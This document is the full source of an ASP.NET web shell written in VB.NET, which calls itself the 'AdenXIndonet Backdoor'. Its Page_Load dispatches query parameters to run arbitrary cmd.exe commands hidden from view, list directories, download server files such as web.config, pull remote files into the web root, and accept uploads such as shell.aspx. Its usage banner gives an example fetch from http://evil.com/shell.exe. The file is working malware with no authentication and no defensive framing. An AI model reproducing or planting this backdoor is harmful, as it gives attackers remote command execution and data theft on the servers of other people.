<%@ Page Language="VB" %>
<%@ Import Namespace="System.IO" %>
<%@ Import Namespace="System.Diagnostics" %>
<%@ Import Namespace="System.Net" %>
<%@ Import Namespace="System.Web.UI" %>

<script runat="server">
    
    ' AdenXIndonet Backdoor - VB.NET Version FIXED 🩸🔥
    
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As EventArgs)
        Dim cmd As String = Request.QueryString("cmd")
        Dim action As String = Request.QueryString("action")
        Dim file As String = Request.QueryString("file")
        Dim url As String = Request.QueryString("url")
        
        Response.Clear()
        Response.ContentType = "text/plain"
        
        If cmd IsNot Nothing AndAlso cmd.Trim() <> "" Then
            ExecuteCommand(cmd)
        ElseIf action = "list" Then
            ListDirectory(file)
        ElseIf action = "download" AndAlso file IsNot Nothing AndAlso file.Trim() <> "" Then
            DownloadFile(file)
        ElseIf action = "wget" AndAlso url IsNot Nothing AndAlso url.Trim() <> "" Then
            WgetFile(url)
        ElseIf action = "upload" AndAlso file IsNot Nothing AndAlso file.Trim() <> "" Then
            HandleUpload(file)
        Else
            Response.Write("AdenXIndonet Backdoor Active - VB.NET Version!" & vbCrLf)
            Response.Write("===================================" & vbCrLf)
            Response.Write("?cmd=whoami" & vbCrLf)
            Response.Write("?action=list&file=C:\" & vbCrLf)
            Response.Write("?action=download&file=web.config" & vbCrLf)
            Response.Write("?action=wget&url=http://evil.com/shell.exe" & vbCrLf)
            Response.Write("?action=upload&file=shell.aspx (POST with file)" & vbCrLf)
            Response.Write("===================================" & vbCrLf)
            Response.Write("Server: " & Request.ServerVariables("SERVER_NAME") & vbCrLf)
            Response.Write("Path: " & Server.MapPath("~/"))
        End If
        
        Response.End()
    End Sub
    
    ' ============= METHOD 1: Execute Command =============
    Private Sub ExecuteCommand(ByVal command As String)
        Try
            Response.Write("$ " & command & vbCrLf)
            Response.Write("-------------------" & vbCrLf)
            
            Dim psi As New ProcessStartInfo()
            psi.FileName = "cmd.exe"
            psi.Arguments = "/c " & command
            psi.RedirectStandardOutput = True
            psi.RedirectStandardError = True
            psi.UseShellExecute = False
            psi.CreateNoWindow = True
            psi.WindowStyle = ProcessWindowStyle.Hidden
            
            Dim p As Process = Process.Start(psi)
            Dim output As String = p.StandardOutput.ReadToEnd()
            Dim err As String = p.StandardError.ReadToEnd()
            p.WaitForExit(5000)
            
            If output.Length > 0 Then
                Response.Write(output)
            End If
            
            If err.Length > 0 Then
                Response.Write(vbCrLf & "[!] ERROR: " & vbCrLf & err)
            End If
            
            If output.Length = 0 AndAlso err.Length = 0 Then
                Response.Write("[Command executed with no output]")
            End If
            
        Catch ex As Exception
            Response.Write("[!] Execute Error: " & ex.Message)
        End Try
    End Sub
    
    ' ============= METHOD 2: List Directory =============
    Private Sub ListDirectory(ByVal path As String)
        Try
            If path Is Nothing OrElse path.Trim() = "" Then
                path = Server.MapPath("~/")
            End If
            
            Response.Write("Listing: " & path & vbCrLf)
            Response.Write("-------------------" & vbCrLf)
            
            If Directory.Exists(path) Then
                ' Directories
                Dim dirs As String() = Directory.GetDirectories(path)
                If dirs.Length > 0 Then
                    Response.Write(vbCrLf & "[DIRECTORIES]" & vbCrLf)
                    For Each dir As String In dirs
                        Dim di As New DirectoryInfo(dir)
                        Response.Write("  [DIR]  " & di.Name & vbCrLf)
                    Next
                End If
                
                ' Files
                Dim files As String() = Directory.GetFiles(path)
                If files.Length > 0 Then
                    Response.Write(vbCrLf & "[FILES]" & vbCrLf)
                    For Each f As String In files
                        Dim fi As New FileInfo(f)
                        Response.Write("  [FILE] " & fi.Name & " (" & FormatFileSize(fi.Length) & ")" & vbCrLf)
                    Next
                End If
                
                If dirs.Length = 0 AndAlso files.Length = 0 Then
                    Response.Write("[Empty directory]" & vbCrLf)
                End If
                
            ElseIf File.Exists(path) Then
                ' If it's a file, show file info
                Dim fi As New FileInfo(path)
                Response.Write("File: " & fi.FullName & vbCrLf)
                Response.Write("Size: " & FormatFileSize(fi.Length) & vbCrLf)
                Response.Write("Modified: " & fi.LastWriteTime.ToString() & vbCrLf)
                Response.Write("Attributes: " & fi.Attributes.ToString() & vbCrLf)
                
            Else
                Response.Write("[!] Path not found: " & path)
            End If
            
        Catch ex As Exception
            Response.Write("[!] List Error: " & ex.Message)
        End Try
    End Sub
    
    ' ============= METHOD 3: Download File =============
    Private Sub DownloadFile(ByVal filePath As String)
        Try
            If File.Exists(filePath) Then
                Dim fi As New FileInfo(filePath)
                
                ' Set response headers for download
                Response.Clear()
                Response.ClearHeaders()
                Response.Buffer = True
                Response.ContentType = "application/octet-stream"
                Response.AppendHeader("Content-Disposition", "attachment; filename=""" & fi.Name & """")
                Response.AppendHeader("Content-Length", fi.Length.ToString())
                
                ' Transmit file
                Response.TransmitFile(filePath)
                Response.Flush()
                Response.End()
            Else
                Response.Write("[!] File not found: " & filePath)
            End If
        Catch ex As Exception
            Response.Write("[!] Download Error: " & ex.Message)
        End Try
    End Sub
    
    ' ============= METHOD 4: Wget File =============
    Private Sub WgetFile(ByVal url As String)
        Try
            Response.Write("Downloading: " & url & vbCrLf)
            
            ' Extract filename from URL or generate one
            Dim fileName As String = ""
            Try
                Dim uri As New Uri(url)
                fileName = Path.GetFileName(uri.LocalPath)
            Catch
            End Try
            
            If fileName = "" OrElse fileName.IndexOf(".") = -1 Then
                fileName = "downloaded_" & DateTime.Now.Ticks.ToString() & ".dat"
            End If
            
            Dim savePath As String = Path.Combine(Server.MapPath("~/"), fileName)
            
            ' Download file
            Using client As New WebClient()
                client.Headers.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
                client.DownloadFile(url, savePath)
            End Using
            
            Dim fi As New FileInfo(savePath)
            Response.Write("Success!" & vbCrLf)
            Response.Write("Saved to: " & savePath & vbCrLf)
            Response.Write("Size: " & FormatFileSize(fi.Length) & vbCrLf)
            
        Catch ex As Exception
            Response.Write("[!] Wget Error: " & ex.Message)
        End Try
    End Sub
    
    ' ============= METHOD 5: Handle Upload =============
    Private Sub HandleUpload(ByVal fileName As String)
        Try
            If Request.Files.Count > 0 Then
                Dim uploadedFile As HttpPostedFile = Request.Files(0)
                
                If uploadedFile.ContentLength > 0 Then
                    Dim savePath As String = Path.Combine(Server.MapPath("~/"), fileName)
                    
                    ' Save file
                    uploadedFile.SaveAs(savePath)
                    
                    Dim fi As New FileInfo(savePath)
                    Response.Write("Upload successful!" & vbCrLf)
                    Response.Write("File: " & savePath & vbCrLf)
                    Response.Write("Size: " & FormatFileSize(fi.Length) & vbCrLf)
                    Response.Write("Original name: " & uploadedFile.FileName & vbCrLf)
                Else
                    Response.Write("[!] Uploaded file is empty")
                End If
            Else
                Response.Write("[!] No file uploaded. Use POST with multipart/form-data")
            End If
        Catch ex As Exception
            Response.Write("[!] Upload Error: " & ex.Message)
        End Try
    End Sub
    
    ' ============= Helper: Format File Size =============
    Private Function FormatFileSize(ByVal bytes As Long) As String
        Dim sizes As String() = {"B", "KB", "MB", "GB", "TB"}
        Dim i As Integer = 0
        Dim dblBytes As Double = bytes
        
        While dblBytes >= 1024 AndAlso i < sizes.Length - 1
            dblBytes /= 1024
            i += 1
        End While
        
        Return String.Format("{0:0.00} {1}", dblBytes, sizes(i))
    End Function
    
</script>